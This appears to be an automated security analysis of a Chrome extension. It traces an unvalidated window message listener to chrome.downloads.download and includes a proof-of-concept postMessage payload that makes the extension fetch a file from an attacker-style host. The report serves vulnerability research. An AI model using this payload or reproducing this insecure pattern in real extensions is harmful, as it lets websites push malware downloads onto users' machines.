# CoCo Analysis: cdcnbghmopepcjhpcoeggggemedhmcgb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cdcnbghmopepcjhpcoeggggemedhmcgb/opgen_generated_files/cs_0.js
Line 473	window.addEventListener("message",function(e){
Line 475	  var ext=e.data.type.split("/")[1].split(";")[0];
Line 478	  chrome.runtime.sendMessage({name:fn,url:e.data.url},function(res){

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener("message",function(e){
  console.log("download:",e);
  var ext=e.data.type.split("/")[1].split(";")[0]; // ← attacker-controlled
  var fn=e.data.name+"."+ext; // ← attacker-controlled filename
  console.log(fn,chrome);
  chrome.runtime.sendMessage({name:fn,url:e.data.url},function(res){ // ← sends attacker URL
    console.log(res);
  });
});

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener(function(request,sender,callback){
  console.log("received",request,sender,callback);

  chrome.downloads.download({url:request.url,filename:"videoplayback.mp4"}); // ← downloads from attacker URL
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// On any YouTube page where this extension is active, a malicious script can trigger:
window.postMessage({
  type: "video/mp4;",
  name: "malware",
  url: "https://attacker.com/malware.exe"
}, "*");
```

**Impact:** An attacker can trigger arbitrary file downloads from any URL. While the background script hardcodes the filename to "videoplayback.mp4", the attacker fully controls the download URL, enabling download of malicious files (malware, exploits, etc.) to the user's system.
